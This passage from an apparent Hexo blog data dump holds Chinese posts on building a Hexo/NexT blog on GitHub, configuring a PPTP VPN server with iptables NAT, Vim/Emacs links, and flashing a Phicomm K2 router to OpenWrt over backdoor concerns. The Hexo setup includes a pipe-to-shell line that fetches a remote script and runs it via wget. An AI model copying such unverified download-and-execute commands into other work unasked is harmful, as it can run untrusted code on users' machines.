#此处应保证项目(username替换成你的名字)目录已被git remote add等操作过即已经绑定github项目,如果不绑定也能用即可忽略  \n$ cd username.github.com　　　　　　#切换到工作目录   \n$ npm install　　　　#npm加载,从远程端加载默认配置文件到本地  \n$ hexo g　　　#生成相应的文件和文档,每次更改之后都要键入这行命令，或者直接键入hexo g -d就可生成并上传  \n$ hexo s 　　　#开启服务监听，即在本地可以访问，默认是http://localhost:4000,每次可以先在本地浏览无误后上传至github  \n$ hexo d　　　#上传至github,可以在浏览器键入username.github.io二级域名进行访问，在此之前需要配置好_config.yml文件\n</code></pre><h4 id=\"2-配置\"><a href=\"#2-配置\" class=\"headerlink\" title=\"2. 配置\"></a>2. 配置</h4><p><code>按照教程更改相应参数即可，若上述命令中遇到有错误，可直接google或者按照错误打印出来的网址进行访问即可得到解决方案,下图是我的github配置,某些情况下可能需要改成使用https,但是仍然可以不必每次都输入账户名和密码</code><br><img src=\"/images/git.png\" alt=\"github配置\"></p>\n<h4 id=\"3-选择主题\"><a href=\"#3-选择主题\" class=\"headerlink\" title=\"3. 选择主题\"></a>3. 选择主题</h4><p><code>我觉得加载一个好的主题对一个博客还是很重要的，所以我找了很久，官方放出来的链接在这里</code><a href=\"https://hexo.io/themes/index.html\" title=\"theme\" target=\"_blank\" rel=\"external\">https://hexo.io/themes/index.html</a>,<code>慢慢寻找吧，几乎都是开源可用的，有一些需要一些前端方面的知识．建议选择Next．pacman等经典的主题，即简单又美观.</code>  </p>\n<h4 id=\"4-编辑和发布\"><a href=\"#4-编辑和发布\" class=\"headerlink\" title=\"4. 编辑和发布\"></a>4. 编辑和发布</h4><p><code>参考前文教程装好所有的插件(评论系统，统计，打赏系统等)之后就可以自己写文章发布了，在这里注意完成菜单下的各个类别的目录的创建．比如</code><strong>hexo new page “tags”</strong><code>等，否则会导致访问失败．参考快速写文章的命令以及生成和发布命令可以使得写作是一种享受哦．一起来用MarkDown写博客吧.</code>  </p>\n","excerpt":"","more":"<h1 id=\"Hexo-and-NexT-on-Github-建博客折腾…\"><a href=\"#Hexo-and-NexT-on-Github-建博客折腾…\" class=\"headerlink\" title=\"Hexo and NexT on Github 建博客折腾…\"></a>Hexo and NexT on Github 建博客折腾…</h1><hr>\n<p><strong>参考资料</strong>  </p>\n<ol>\n<li><a href=\"https://hexo.io/zh-cn/docs/\" title=\"Hexo官网\">Hexo.io原装教程:https://hexo.io/zh-cn/docs/</a>  </li>\n<li><a href=\"http://theme-next.iissnan.com/theme-settings.html\" title=\"Next主题\">Next主题配置:http://theme-next.iissnan.com/theme-settings.html</a>  </li>\n<li><a href=\"http://ibruce.info/2013/11/22/hexo-your-blog/\" title=\"不如的博客\">不如的教程，很是详细:http://ibruce.info/2013/11/22/hexo-your-blog/</a>  </li>\n<li><a href=\"http://bubkoo.com/2013/12/16/hexo-issure/\" title=\"tags..\">bubukoo:http://bubkoo.com/2013/12/16/hexo-issure/</a>  </li>\n<li><a href=\"http://www.cnblogs.com/debugzer0/articles/5461804.html\">新增tags等:http://www.cnblogs.com/debugzer0/articles/5461804.html</a>  </li>\n</ol>\n<hr>\n<h4 id=\"1-装环境-详情参考官网教程-此处简述，至少github环境安装从略-Windows的有点坑\"><a href=\"#1-装环境-详情参考官网教程-此处简述，至少github环境安装从略-Windows的有点坑\" class=\"headerlink\" title=\"1. 装环境(详情参考官网教程,此处简述，至少github环境安装从略~_~Windows的有点坑)\"></a>1. 装环境(详情参考官网教程,此处简述，至少github环境安装从略~_~Windows的有点坑)</h4><p><strong>安装Node.js</strong><br>    Wget:<br>    <code>$ wget -qO- https://raw.github.com/creationix/nvm/master/install.sh | sh</code><br>    安装完成后，重启终端并执行一下命令：<br>    <code>$ nvm install stable</code><br><strong>安装Hexo</strong><br>    <code>$ npm install hexo-cli -g　　#装hexo</code><br><strong>初始化项目并开启服务</strong>(在github上建立一个名为username.github.io(或者com)项目，并在本地仓库进行绑定)</p>\n<pre><code>$ hexo init username.github.com　#此处应保证项目(username替换成你的名字)目录已被git remote add等操作过即已经绑定github项目,如果不绑定也能用即可忽略  \n$ cd username.github.com　　　　　　#切换到工作目录   \n$ npm install　　　　#npm加载,从远程端加载默认配置文件到本地  \n$ hexo g　　　#生成相应的文件和文档,每次更改之后都要键入这行命令，或者直接键入hexo g -d就可生成并上传  \n$ hexo s 　　　#开启服务监听，即在本地可以访问，默认是http://localhost:4000,每次可以先在本地浏览无误后上传至github  \n$ hexo d　　　#上传至github,可以在浏览器键入username.github.io二级域名进行访问，在此之前需要配置好_config.yml文件\n</code></pre><h4 id=\"2-配置\"><a href=\"#2-配置\" class=\"headerlink\" title=\"2. 配置\"></a>2. 配置</h4><p><code>按照教程更改相应参数即可，若上述命令中遇到有错误，可直接google或者按照错误打印出来的网址进行访问即可得到解决方案,下图是我的github配置,某些情况下可能需要改成使用https,但是仍然可以不必每次都输入账户名和密码</code><br><img src=\"/images/git.png\" alt=\"github配置\"></p>\n<h4 id=\"3-选择主题\"><a href=\"#3-选择主题\" class=\"headerlink\" title=\"3. 选择主题\"></a>3. 选择主题</h4><p><code>我觉得加载一个好的主题对一个博客还是很重要的，所以我找了很久，官方放出来的链接在这里</code><a href=\"https://hexo.io/themes/index.html\" title=\"theme\">https://hexo.io/themes/index.html</a>,<code>慢慢寻找吧，几乎都是开源可用的，有一些需要一些前端方面的知识．建议选择Next．pacman等经典的主题，即简单又美观.</code>  </p>\n<h4 id=\"4-编辑和发布\"><a href=\"#4-编辑和发布\" class=\"headerlink\" title=\"4. 编辑和发布\"></a>4. 编辑和发布</h4><p><code>参考前文教程装好所有的插件(评论系统，统计，打赏系统等)之后就可以自己写文章发布了，在这里注意完成菜单下的各个类别的目录的创建．比如</code><strong>hexo new page “tags”</strong><code>等，否则会导致访问失败．参考快速写文章的命令以及生成和发布命令可以使得写作是一种享受哦．一起来用MarkDown写博客吧.</code>  </p>\n"},{"title":"常用VPN服务器配置","date":"2016-10-27T15:29:29.000Z","_content":"\n\n参考资料:  \n[https://www.nigesb.com/setup-your-own-vpn-with-pptp.html](https://www.nigesb.com/setup-your-own-vpn-with-pptp.html)\n`sudo apt-get install pptpd`  \n编辑/etc/pptpd.conf    \n`localip 10.0.0.1`\n`remoteip 10.0.0.100-200`\n\n\n修改/etc/ppp/pptpd-options.pptpd\n\n`ms-dns 202.96.128.86`\n`ms-dns 202.96.128.166`\n\n/etc/ppp/chap-secrets\n次为：账号，协议，密码，ip地址。\n\n\n编辑系统配置文件/etc/sysctl.conf\n\n`net.ipv4.ip_forward = 1`\n\n\n`sysctl -p`\n\n\n\n\n`iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE`\n`iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356`\n`iptables-save`\n\n\n\n\n系统环境：Debian-6 32-bit\n\niptables是即时生效的，所以无需重启，如果要停止iptables，请使用iptables -F命令，如果要iptables配置重启后仍然有效，请按如下操作步骤\n\n1.创建/etc/iptables文件(文件名可以随意取)\n\n2.创建/etc/network/if-pre-up.d/iptables文件，并给予其执行权限\n`root@hostname:~# touch /etc/network/if-pre-up.d/iptables`\n`root@hostname:~# chmod +x /etc/network/if-pre-up.d/iptables`\n\n3.编辑/etc/network/if-pre-up.d/iptables文件，使其内容如下：\n```bash\n#!/bin/sh\n /sbin/iptables-restore < /etc/iptables\n```\n4.配置iptables，过程略，配置好iptables后，将配置保存到/etc/iptables文件中即可\nroot@hostname:~# iptables-save > /etc/iptables\n\n//配置openvpn\nhttp://www.zhengyali.com/?p=52\nhttp://www.zhengyali.com/?p=66\nhttp://blog.csdn.net/brad_chen/article/details/49633491\nhttp://openvpn.ustc.edu.cn/\n\n\n\n\nopenvpn之树莓派问题\n\n\n\n`sudo apt-get purge openvpn liblzo2-2`\n`sudo apt-get install openvpn`\n","source":"_posts/常用VPN服务器配置.md","raw":"---\ntitle: 常用VPN服务器配置\ndate: 2016-10-27 23:29:29\ncategories:\n- study\ntags:\n- Configure\n- network security\n---\n\n\n参考资料:  \n[https://www.nigesb.com/setup-your-own-vpn-with-pptp.html](https://www.nigesb.com/setup-your-own-vpn-with-pptp.html)\n`sudo apt-get install pptpd`  \n编辑/etc/pptpd.conf    \n`localip 10.0.0.1`\n`remoteip 10.0.0.100-200`\n\n\n修改/etc/ppp/pptpd-options.pptpd\n\n`ms-dns 202.96.128.86`\n`ms-dns 202.96.128.166`\n\n/etc/ppp/chap-secrets\n次为：账号，协议，密码，ip地址。\n\n\n编辑系统配置文件/etc/sysctl.conf\n\n`net.ipv4.ip_forward = 1`\n\n\n`sysctl -p`\n\n\n\n\n`iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE`\n`iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356`\n`iptables-save`\n\n\n\n\n系统环境：Debian-6 32-bit\n\niptables是即时生效的，所以无需重启，如果要停止iptables，请使用iptables -F命令，如果要iptables配置重启后仍然有效，请按如下操作步骤\n\n1.创建/etc/iptables文件(文件名可以随意取)\n\n2.创建/etc/network/if-pre-up.d/iptables文件，并给予其执行权限\n`root@hostname:~# touch /etc/network/if-pre-up.d/iptables`\n`root@hostname:~# chmod +x /etc/network/if-pre-up.d/iptables`\n\n3.编辑/etc/network/if-pre-up.d/iptables文件，使其内容如下：\n```bash\n#!/bin/sh\n /sbin/iptables-restore < /etc/iptables\n```\n4.配置iptables，过程略，配置好iptables后，将配置保存到/etc/iptables文件中即可\nroot@hostname:~# iptables-save > /etc/iptables\n\n//配置openvpn\nhttp://www.zhengyali.com/?p=52\nhttp://www.zhengyali.com/?p=66\nhttp://blog.csdn.net/brad_chen/article/details/49633491\nhttp://openvpn.ustc.edu.cn/\n\n\n\n\nopenvpn之树莓派问题\n\n\n\n`sudo apt-get purge openvpn liblzo2-2`\n`sudo apt-get install openvpn`\n","slug":"常用VPN服务器配置","published":1,"updated":"2016-10-27T15:40:44.781Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciuteb7p80008r1m1n8cth5wd","content":"<p>参考资料:<br><a href=\"https://www.nigesb.com/setup-your-own-vpn-with-pptp.html\" target=\"_blank\" rel=\"external\">https://www.nigesb.com/setup-your-own-vpn-with-pptp.html</a><br><code>sudo apt-get install pptpd</code><br>编辑/etc/pptpd.conf<br><code>localip 10.0.0.1</code><br><code>remoteip 10.0.0.100-200</code></p>\n<p>修改/etc/ppp/pptpd-options.pptpd</p>\n<p><code>ms-dns 202.96.128.86</code><br><code>ms-dns 202.96.128.166</code></p>\n<p>/etc/ppp/chap-secrets<br>次为：账号，协议，密码，ip地址。</p>\n<p>编辑系统配置文件/etc/sysctl.conf</p>\n<p><code>net.ipv4.ip_forward = 1</code></p>\n<p><code>sysctl -p</code></p>\n<p><code>iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</code><br><code>iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356</code><br><code>iptables-save</code></p>\n<p>系统环境：Debian-6 32-bit</p>\n<p>iptables是即时生效的，所以无需重启，如果要停止iptables，请使用iptables -F命令，如果要iptables配置重启后仍然有效，请按如下操作步骤</p>\n<p>1.创建/etc/iptables文件(文件名可以随意取)</p>\n<p>2.创建/etc/network/if-pre-up.d/iptables文件，并给予其执行权限<br><code>root@hostname:~# touch /etc/network/if-pre-up.d/iptables</code><br><code>root@hostname:~# chmod +x /etc/network/if-pre-up.d/iptables</code></p>\n<p>3.编辑/etc/network/if-pre-up.d/iptables文件，使其内容如下：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#!/bin/sh</span></div><div class=\"line\"> /sbin/iptables-restore &lt; /etc/iptables</div></pre></td></tr></table></figure></p>\n<p>4.配置iptables，过程略，配置好iptables后，将配置保存到/etc/iptables文件中即可<br>root@hostname:~# iptables-save &gt; /etc/iptables</p>\n<p>//配置openvpn<br><a href=\"http://www.zhengyali.com/?p=52\" target=\"_blank\" rel=\"external\">http://www.zhengyali.com/?p=52</a><br><a href=\"http://www.zhengyali.com/?p=66\" target=\"_blank\" rel=\"external\">http://www.zhengyali.com/?p=66</a><br><a href=\"http://blog.csdn.net/brad_chen/article/details/49633491\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/brad_chen/article/details/49633491</a><br><a href=\"http://openvpn.ustc.edu.cn/\" target=\"_blank\" rel=\"external\">http://openvpn.ustc.edu.cn/</a></p>\n<p>openvpn之树莓派问题</p>\n<p><code>sudo apt-get purge openvpn liblzo2-2</code><br><code>sudo apt-get install openvpn</code></p>\n","excerpt":"","more":"<p>参考资料:<br><a href=\"https://www.nigesb.com/setup-your-own-vpn-with-pptp.html\">https://www.nigesb.com/setup-your-own-vpn-with-pptp.html</a><br><code>sudo apt-get install pptpd</code><br>编辑/etc/pptpd.conf<br><code>localip 10.0.0.1</code><br><code>remoteip 10.0.0.100-200</code></p>\n<p>修改/etc/ppp/pptpd-options.pptpd</p>\n<p><code>ms-dns 202.96.128.86</code><br><code>ms-dns 202.96.128.166</code></p>\n<p>/etc/ppp/chap-secrets<br>次为：账号，协议，密码，ip地址。</p>\n<p>编辑系统配置文件/etc/sysctl.conf</p>\n<p><code>net.ipv4.ip_forward = 1</code></p>\n<p><code>sysctl -p</code></p>\n<p><code>iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</code><br><code>iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356</code><br><code>iptables-save</code></p>\n<p>系统环境：Debian-6 32-bit</p>\n<p>iptables是即时生效的，所以无需重启，如果要停止iptables，请使用iptables -F命令，如果要iptables配置重启后仍然有效，请按如下操作步骤</p>\n<p>1.创建/etc/iptables文件(文件名可以随意取)</p>\n<p>2.创建/etc/network/if-pre-up.d/iptables文件，并给予其执行权限<br><code>root@hostname:~# touch /etc/network/if-pre-up.d/iptables</code><br><code>root@hostname:~# chmod +x /etc/network/if-pre-up.d/iptables</code></p>\n<p>3.编辑/etc/network/if-pre-up.d/iptables文件，使其内容如下：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#!/bin/sh</span></div><div class=\"line\"> /sbin/iptables-restore &lt; /etc/iptables</div></pre></td></tr></table></figure></p>\n<p>4.配置iptables，过程略，配置好iptables后，将配置保存到/etc/iptables文件中即可<br>root@hostname:~# iptables-save &gt; /etc/iptables</p>\n<p>//配置openvpn<br><a href=\"http://www.zhengyali.com/?p=52\">http://www.zhengyali.com/?p=52</a><br><a href=\"http://www.zhengyali.com/?p=66\">http://www.zhengyali.com/?p=66</a><br><a href=\"http://blog.csdn.net/brad_chen/article/details/49633491\">http://blog.csdn.net/brad_chen/article/details/49633491</a><br><a href=\"http://openvpn.ustc.edu.cn/\">http://openvpn.ustc.edu.cn/</a></p>\n<p>openvpn之树莓派问题</p>\n<p><code>sudo apt-get purge openvpn liblzo2-2</code><br><code>sudo apt-get install openvpn</code></p>\n"},{"title":"vim_and_emacs","date":"2016-08-23T06:20:59.000Z","_content":"\n\n> 在学习Linux的时候，最好从console开始，完全脱离窗体束缚，感受最原始的类DOS时代的`程序员使命感`,由于Linux下编辑器也是五花八门，不过最流行的莫过于Vim和Emacs，在这里附上它们的一些链接便于学习．\n\n参考资料：  \n[Vimdoc:http://vimdoc.sourceforge.net/](http://vimdoc.sourceforge.net/ \"Vimdoc\")\n[Vimnum:http://vimdoc.sourceforge.net/vimum.html](http://vimdoc.sourceforge.net/vimum.html)\n[caole_Vim:http://www.caole.net/diary/vim.html#sec-14](http://www.caole.net/diary/vim.html#sec-14)\n[caole_Vim_improved:http://dsec.pku.edu.cn/~jinlong/vi/Vi.html](http://dsec.pku.edu.cn/~jinlong/vi/Vi.html)\n[caole_Emacs:http://www.caole.net/diary/emacs_tips.html](http://www.caole.net/diary/emacs_tips.html)\n[https://github.com/yangyangwithgnu/use_vim_as_ide](https://github.com/yangyangwithgnu/use_vim_as_ide)\n\n\n","source":"_posts/vim-and-emacs.md","raw":"---\ntitle: vim_and_emacs\ndate: 2016-08-23 14:20:59\ntags:\n- Linux\ncategories: \n- study\n---\n\n\n> 在学习Linux的时候，最好从console开始，完全脱离窗体束缚，感受最原始的类DOS时代的`程序员使命感`,由于Linux下编辑器也是五花八门，不过最流行的莫过于Vim和Emacs，在这里附上它们的一些链接便于学习．\n\n参考资料：  \n[Vimdoc:http://vimdoc.sourceforge.net/](http://vimdoc.sourceforge.net/ \"Vimdoc\")\n[Vimnum:http://vimdoc.sourceforge.net/vimum.html](http://vimdoc.sourceforge.net/vimum.html)\n[caole_Vim:http://www.caole.net/diary/vim.html#sec-14](http://www.caole.net/diary/vim.html#sec-14)\n[caole_Vim_improved:http://dsec.pku.edu.cn/~jinlong/vi/Vi.html](http://dsec.pku.edu.cn/~jinlong/vi/Vi.html)\n[caole_Emacs:http://www.caole.net/diary/emacs_tips.html](http://www.caole.net/diary/emacs_tips.html)\n[https://github.com/yangyangwithgnu/use_vim_as_ide](https://github.com/yangyangwithgnu/use_vim_as_ide)\n\n\n","slug":"vim-and-emacs","published":1,"updated":"2016-09-01T08:42:10.280Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciuteb7pk000ar1m1g8y8p037","content":"<blockquote>\n<p>在学习Linux的时候，最好从console开始，完全脱离窗体束缚，感受最原始的类DOS时代的<code>程序员使命感</code>,由于Linux下编辑器也是五花八门，不过最流行的莫过于Vim和Emacs，在这里附上它们的一些链接便于学习．</p>\n</blockquote>\n<p>参考资料：<br><a href=\"http://vimdoc.sourceforge.net/\" title=\"Vimdoc\" target=\"_blank\" rel=\"external\">Vimdoc:http://vimdoc.sourceforge.net/</a><br><a href=\"http://vimdoc.sourceforge.net/vimum.html\" target=\"_blank\" rel=\"external\">Vimnum:http://vimdoc.sourceforge.net/vimum.html</a><br><a href=\"http://www.caole.net/diary/vim.html#sec-14\" target=\"_blank\" rel=\"external\">caole_Vim:http://www.caole.net/diary/vim.html#sec-14</a><br><a href=\"http://dsec.pku.edu.cn/~jinlong/vi/Vi.html\" target=\"_blank\" rel=\"external\">caole_Vim_improved:http://dsec.pku.edu.cn/~jinlong/vi/Vi.html</a><br><a href=\"http://www.caole.net/diary/emacs_tips.html\" target=\"_blank\" rel=\"external\">caole_Emacs:http://www.caole.net/diary/emacs_tips.html</a><br><a href=\"https://github.com/yangyangwithgnu/use_vim_as_ide\" target=\"_blank\" rel=\"external\">https://github.com/yangyangwithgnu/use_vim_as_ide</a></p>\n","excerpt":"","more":"<blockquote>\n<p>在学习Linux的时候，最好从console开始，完全脱离窗体束缚，感受最原始的类DOS时代的<code>程序员使命感</code>,由于Linux下编辑器也是五花八门，不过最流行的莫过于Vim和Emacs，在这里附上它们的一些链接便于学习．</p>\n</blockquote>\n<p>参考资料：<br><a href=\"http://vimdoc.sourceforge.net/\" title=\"Vimdoc\">Vimdoc:http://vimdoc.sourceforge.net/</a><br><a href=\"http://vimdoc.sourceforge.net/vimum.html\">Vimnum:http://vimdoc.sourceforge.net/vimum.html</a><br><a href=\"http://www.caole.net/diary/vim.html#sec-14\">caole_Vim:http://www.caole.net/diary/vim.html#sec-14</a><br><a href=\"http://dsec.pku.edu.cn/~jinlong/vi/Vi.html\">caole_Vim_improved:http://dsec.pku.edu.cn/~jinlong/vi/Vi.html</a><br><a href=\"http://www.caole.net/diary/emacs_tips.html\">caole_Emacs:http://www.caole.net/diary/emacs_tips.html</a><br><a href=\"https://github.com/yangyangwithgnu/use_vim_as_ide\">https://github.com/yangyangwithgnu/use_vim_as_ide</a></p>\n"},{"title":"没这么好的\"馅饼\"","date":"2016-10-28T06:23:07.000Z","_content":"\n\n> 自己本来想买个路由器来着,想着几十块钱也是钱,一直到同学跟我说某东上有推销,而鹅厂的丘丘广告栏居然也有,抱着试了的心态购了一台斐讯K2.\n\n  \n参考资料:  \n[http://bbs.newifi.com/thread-3351-1-1.html](http://bbs.newifi.com/thread-3351-1-1.html)\n[http://www.shaoit.com/feixunshuaji.html](http://www.shaoit.com/feixunshuaji.html)\n[http://www.qqgzs.com/archives/k2-v22-148.html](http://www.qqgzs.com/archives/k2-v22-148.html)\n[http://www.openwrt.org.cn/bbs/thread-60-1-1.html](http://www.openwrt.org.cn/bbs/thread-60-1-1.html)\n[http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/](http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/)\n[OpenWrt官方文档:http://wiki.openwrt.org/zh-cn/doc/start](http://wiki.openwrt.org/zh-cn/doc/start)\n\n\n----------------------\n\n\n\n##  到货\n看起来很不错的样子,包装很漂亮.先不说返现的事情咯,根据基本的教程大概知道该路由器比一般的路由器功能还是丰富一些.从网上一查才知道居然带有[后门](http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/),吓得我赶紧连开机都不试了就开始找各种固件.\n\n##  刷刷刷\n根据上述链接基本的一些教程一步一步来,首先知道了原生固件也阉割了很多功能(ssh和telnet服务被禁),估计也是为了加大一般发烧友DIY的难度.我猜测有很多路由器厂商做的路由器都有漏洞的,不管是无意的还是有意的硬编码的后门,还是用开源的东西安全一些,毕竟有社区在维护,当然自己也可以贡献力量.就如近期炒得很火热的米国一半的互联网企业遭受DDOS攻击致使互联网企业域名无法解析而瘫痪,研究称是祖国某几家生产监控设备的厂商的监控产品受到Mirai恶意软件(蠕虫)等的劫持和感染而加入了僵尸网络同时对米国各大互联网企业进行\"测试\"...为了安全,我决定还是刷**OpenWrt**.当然也有同学刷其他固件的,也不错.从[这里](http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/)提供的云盘链接下载的K2配置文件发现不能恢复,后来从[这里](http://www.qqgzs.com/archives/k2-v22-148.html)下载的配置文件就可以用了,当然,我也不能打包票地说breed没有问题,毕竟目前也还没有实力去逆向工程分析.只能选择信任网友们了.某些教程提供的一件刷机不知是否可行,我的不行,看URL应该是直接从另外一个URL Wget一个脚本到本地执行,但是我的居然报404错误...后来还是果断选择了先解决breed,而后再刷OpenWrt固件.\n![OpenWrt](/images/OpenWrt.png)\n\n##  测试玩玩\n关于OpenWrt在开源社区应该很知名,因此文档和使用手册也应该俱全.具体的可以多学习下高级用法和某些服务器的配置以及一些常见的开发.首先进入Web端设置好登录密码和root密码,同时使能ssh服务,把自己的公钥证书复制到相应的地方保存和应用.接下来通过PC的以太网口或者Wifi(保证先配置好)`ssh root@IP_Address`即可直接免密钥登录OpenWrt了,瞬间又找到了Linux的感觉,可以知道这里的shell是用的busybox,因为/bin/sh是busybox的一个软链接(其实/bin目录下绝大部分的命令都指向了busybox,足以见得它的强大),在嵌入式Linux中很常见.建议只允许从局域网中登录和管理,提高安全性.\n![OpenWrt_ssh](/images/OpenWrt_ssh.png)\n\n## 总结\n东西不是白送的,除了泄露个人理财信息之外技术上还进行了一些限制和\"数据采集\",作为小白鼠也得Get一些技能来保护自己,实在不放心在一台中间设备开个tcpdump或者wireshark在WAN口一直监听即可测试.\n","source":"_posts/没这么好的馅饼.md","raw":"---\ntitle: 没这么好的\"馅饼\"\ndate: 2016-10-28 14:23:07\ncategories:\n- study\ntags:\n- Configure\n- network security\n---\n\n\n> 自己本来想买个路由器来着,想着几十块钱也是钱,一直到同学跟我说某东上有推销,而鹅厂的丘丘广告栏居然也有,抱着试了的心态购了一台斐讯K2.\n\n  \n参考资料:  \n[http://bbs.newifi.com/thread-3351-1-1.html](http://bbs.newifi.com/thread-3351-1-1.html)\n[http://www.shaoit.com/feixunshuaji.html](http://www.shaoit.com/feixunshuaji.html)\n[http://www.qqgzs.com/archives/k2-v22-148.html](http://www.qqgzs.com/archives/k2-v22-148.html)\n[http://www.openwrt.org.cn/bbs/thread-60-1-1.html](http://www.openwrt.org.cn/bbs/thread-60-1-1.html)\n[http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/](http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/)\n[OpenWrt官方文档:http://wiki.openwrt.org/zh-cn/doc/start](http://wiki.openwrt.org/zh-cn/doc/start)\n\n\n----------------------\n\n\n\n##  到货\n看起来很不错的样子,包装很漂亮.先不说返现的事情咯,根据基本的教程大概知道该路由器比一般的路由器功能还是丰富一些.从网上一查才知道居然带有[后门](http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/),吓得我赶紧连开机都不试了就开始找各种固件.\n\n##  刷刷刷\n根据上述链接基本的一些教程一步一步来,首先知道了原生固件也阉割了很多功能(ssh和telnet服务被禁),估计也是为了加大一般发烧友DIY的难度.我猜测有很多路由器厂商做的路由器都有漏洞的,不管是无意的还是有意的硬编码的后门,还是用开源的东西安全一些,毕竟有社区在维护,当然自己也可以贡献力量.就如近期炒得很火热的米国一半的互联网企业遭受DDOS攻击致使互联网企业域名无法解析而瘫痪,研究称是祖国某几家生产监控设备的厂商的监控产品受到Mirai恶意软件(蠕虫)等的劫持和感染而加入了僵尸网络同时对米国各大互联网企业进行\"测试\"...为了安全,我决定还是刷**OpenWrt**.当然也有同学刷其他固件的,也不错.从[这里](http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/)提供的云盘链接下载的K2配置文件发现不能恢复,后来从[这里](http://www.qqgzs.com/archives/k2-v22-148.html)下载的配置文件就可以用了,当然,我也不能打包票地说breed没有问题,毕竟目前也还没有实力去逆向工程分析.只能选择信任网友们了.某些教程提供的一件刷机不知是否可行,我的不行,看URL应该是直接从另外一个URL Wget一个脚本到本地执行,但是我的居然报404错误...后来还是果断选择了先解决breed,而后再刷OpenWrt固件.\n![OpenWrt](/images/OpenWrt.png)\n\n##  测试玩玩\n关于OpenWrt在开源社区应该很知名,因此文档和使用手册也应该俱全.具体的可以多学习下高级用法和某些服务器的配置以及一些常见的开发.首先进入Web端设置好登录密码和root密码,同时使能ssh服务,把自己的公钥证书复制到相应的地方保存和应用.接下来通过PC的以太网口或者Wifi(保证先配置好)`ssh root@IP_Address`即可直接免密钥登录OpenWrt了,瞬间又找到了Linux的感觉,可以知道这里的shell是用的busybox,因为/bin/sh是busybox的一个软链接(其实/bin目录下绝大部分的命令都指向了busybox,足以见得它的强大),在嵌入式Linux中很常见.建议只允许从局域网中登录和管理,提高安全性.\n![OpenWrt_ssh](/images/OpenWrt_ssh.png)\n\n## 总结\n东西不是白送的,除了泄露个人理财信息之外技术上还进行了一些限制和\"数据采集\",作为小白鼠也得Get一些技能来保护自己,实在不放心在一台中间设备开个tcpdump或者wireshark在WAN口一直监听即可测试.\n","slug":"没这么好的馅饼","published":1,"updated":"2016-11-03T09:02:28.097Z","_id":"ciuteb7pp000cr1m1pr0djl1f","comments":1,"layout":"post","photos":[],"link":"","content":"<blockquote>\n<p>自己本来想买个路由器来着,想着几十块钱也是钱,一直到同学跟我说某东上有推销,而鹅厂的丘丘广告栏居然也有,抱着试了的心态购了一台斐讯K2.</p>\n</blockquote>\n<p>参考资料:<br><a href=\"http://bbs.newifi.com/thread-3351-1-1.html\" target=\"_blank\" rel=\"external\">http://bbs.newifi.com/thread-3351-1-1.html</a><br><a href=\"http://www.shaoit.com/feixunshuaji.html\" target=\"_blank\" rel=\"external\">http://www.shaoit.com/feixunshuaji.html</a><br><a href=\"http://www.qqgzs.com/archives/k2-v22-148.html\" target=\"_blank\" rel=\"external\">http://www.qqgzs.com/archives/k2-v22-148.html</a><br><a href=\"http://www.openwrt.org.cn/bbs/thread-60-1-1.html\" target=\"_blank\" rel=\"external\">http://www.openwrt.org.cn/bbs/thread-60-1-1.html</a><br><a href=\"http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/\" target=\"_blank\" rel=\"external\">http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/</a><br><a href=\"http://wiki.openwrt.org/zh-cn/doc/start\" target=\"_blank\" rel=\"external\">OpenWrt官方文档:http://wiki.openwrt.org/zh-cn/doc/start</a></p>\n<hr>\n<h2 id=\"到货\"><a href=\"#到货\" class=\"headerlink\" title=\"到货\"></a>到货</h2><p>看起来很不错的样子,包装很漂亮.先不说返现的事情咯,根据基本的教程大概知道该路由器比一般的路由器功能还是丰富一些.从网上一查才知道居然带有<a 